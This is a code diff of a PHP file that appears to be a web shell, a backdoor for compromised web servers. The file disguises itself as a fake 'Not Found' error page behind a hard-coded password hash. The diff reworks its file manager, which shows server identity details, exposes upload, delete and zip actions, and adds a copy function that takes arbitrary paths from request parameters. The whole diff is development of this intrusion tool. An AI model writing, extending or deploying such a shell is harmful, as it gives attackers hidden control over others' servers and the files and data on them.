@@ -7,7 +7,7 @@ date_default_timezone_set('Asia/Jakarta');
 $pass = "b4914600112ba18af7798b6c1a1363728ae1d96f"; // sha1(sad)
 function login() {
 ?>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.1">
 <h1>Not Found</h1>
   <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
   <hr>
@@ -461,22 +461,39 @@ input[type=submit] {
   a.z {
   	margin-left:10px;
   }
+  td.cp; {
+  	width:10px;
+  }
 </style>
 <body>
-<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.5/lib/darkmode-js.min.js"></script>
 <script>
-  new Darkmode().showWidget();
+function hide() {
+  var x = document.getElementById("hide");
+  if (x.style.display === "none") {
+    x.style.display = "block";
+  } else {
+    x.style.display = "none";
+  }
+}
 </script>
 <center>
 <table>
 <thead>
 	<tr>
+		<td colspan="5" class="yes" onclick="hide()">FILEMANAGER</td>
+	</tr>
+	<tr>
 		<td class="yes" colspan="5">
-			<?php
-			foreach (get_server_info() as $k) {
-    			echo "<div clas='k'>".$k."</div>";
-    		}
-    		?>
+			<div id='hide'>
+				<span class="strong">Server IP : <?=isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"]?></span><br>
+				<span class='strong' style='color:green;'><?=php_uname()?></span><br>
+				<span class="strong"><?=getenv('SERVER_SOFTWARE')?></span><br>
+				<span class="strong">Current Dir : <?=cwd()?></span><br>
+				<div>
+					<a href="#">HOME</a>
+					<a href="#">UPLOAD</a>
+				</div>
+			</div>
     	</td>
     </tr>
 </thead>
@@ -1196,16 +1213,6 @@ if (isset($_GET['edit'])) {
 	<?php
 	exit();
 }
-function get_server_info(){
-    $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
-    $server_info['ip_adrress'] = "<span class='strong'>Server IP : <span style='color:green;'>".$server_addr."</span>";
-    $server_info['uname'] = "<span class='strong' style='color:green;'>".php_uname()."</span>";
-    $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
-    $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
-    $server_info['dir'] = "<span class='strong'><u>".cwd()."</u></span>";
-    //$server_info['upload'] = "<span class='strong'>".upload()."</span>";
-    return $server_info;
-  }
   ?>
   <tbody>
   <form method="post" action="?path=<?=cwd()?>">
@@ -1310,11 +1317,13 @@ function get_server_info(){
   ?>
 <tr>
 	<td class="not" colspan="3">
-		<select name="mode">
+		<select name="mode" style="width:100%;">
 			<option value="" selected>action</option>
 			<option> </option>
 			<option value="1">delete</option>
 			<option value="2">zip</option>
+			<option value="3">copy</option>
+			<option> </option>
 			<?php
 			foreach ($scandir as $file_zip) {
 				if (is_file($file_zip)) {
@@ -1328,7 +1337,6 @@ function get_server_info(){
 				}
 			}
 			?>
-			<option value="copy">copy</option>
 		</select>
 	</td>
 	<td class="not">
@@ -1363,6 +1371,9 @@ if (isset($_POST['submit'])) {
 					alert("failed", "<u>".basename($value)."</u> to zip !");
 				}
 				break;
+			case '3':
+				print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copi=file&filename='.$value.'">');
+				break;
 			}
 		}
 	}
@@ -1384,35 +1395,33 @@ switch ($_POST['mode']) {
 			}
 		}
 	break;
-	case 'copy':
-		?>
-		<form method="post">
-			<tr>
-				<td colspan="2">
-					<input class="action" type="text" name="" value="<?=basename($value)?>" readonly>
-				</td>
-				<td>to</td>
-				<td>
-					<input class="action" type="text" name="to" value="<?=cwd()?>">
-				</td>
-				<td>
-					<input type="submit" name="copy" value="copy">
-				</td>
-			</tr>
-		</form>
-		<?php
-		if (isset($_POST['copy'])) {
-			$data = $_POST['data'];
-			$to   = $_POST['to']; 
-			foreach ($data as $key => $value) {
-				if (copy($value, $to.'/'.$value)) {
-					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copy=success&filename='.$value.'&to='.$to.'">');
-				} else {
-					print('<meta http-equiv="refresh" content="0;url=?path='.cwd().'&copy=failed&filename='.$value.'&to='.$to.'">');
-				}
-			}
+}
+if ($_GET['copi'] == 'file') {
+	$file = $_GET['filename'];
+	$to = $_POST['to'];
+	if (isset($_POST['submit'])) {
+		if (copy($file, $to.'/'.basename($file))) {
+			alert("success", "copied <u>".$file." to ".$to."</u>");
+		} else {
+			alert("failed", "copied <u>".$file." to ".$to."</u>");
 		}
-		break;
+	}
+	?>
+	<form method="post">
+		<tr>
+			<td colspan="2" class="not cp">
+				<input style="padding:7px;" class="action" type="text" name="" value="<?=basename($file)?>" readonly>
+			</td>
+			<td class="not">
+				<input style="padding:7px 4px;" class="action" type="text" name="to" value="<?=cwd()?>">
+			</td>
+			<td class="not">
+				<input style="margin-left:3.5px;" type="submit" name="submit">
+			</td>
+		</tr>
+	</form>
+	<?php
+
 }
 if ($_GET['unzip'] == 'success') {
 	alert("success", "<u>".$_GET['filename']."</u> Unzip to <u>".cwd()."</u>");
@@ -1424,12 +1433,6 @@ if ($_GET['delete'] == 'success') {
 	alert("success", "Deleted <u>".$_GET['filename']."</u>");
 } elseif ($_GET['delete'] == 'failed') {
 	alert("failed", "Deleted <u>".$_GET['filename']."</u>");
-}
-
-if ($_GET['copy'] == 'success') {
-	alert("success", "copied <u>".$_GET['filename']." to ".$_GET['to']."</u>");
-} elseif ($_GET['copy'] == 'failed') {
-	alert("success", "copied <u>".$_GET['filename']." to ".$_GET['to']."</u>");
 }
 ?>
 <script type="text/javascript">
